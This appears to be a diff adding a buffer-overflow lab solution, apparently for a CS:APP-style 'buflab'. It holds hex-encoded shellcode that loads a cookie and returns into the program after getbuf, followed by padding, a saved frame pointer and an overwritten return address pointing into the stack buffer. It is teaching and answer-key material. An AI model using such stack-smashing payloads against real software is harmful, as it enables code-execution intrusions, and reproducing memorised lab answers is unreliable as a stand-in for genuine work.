@@ -1,0 +1,11 @@
+/* mov 0x804c220, %eax (0x804c220 is address of cookie) */
+a1 20 c2 04 08
+/* push 0x8048e81 (0x8048e81 is address of code after getbuf) */
+68 81 8e 04 08
+/* ret */
+c3
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* content of %ebp: 0x55683560 */
+60 35 68 55
+/* Local buffer starts at address:	0x55683508 */
+08 35 68 55
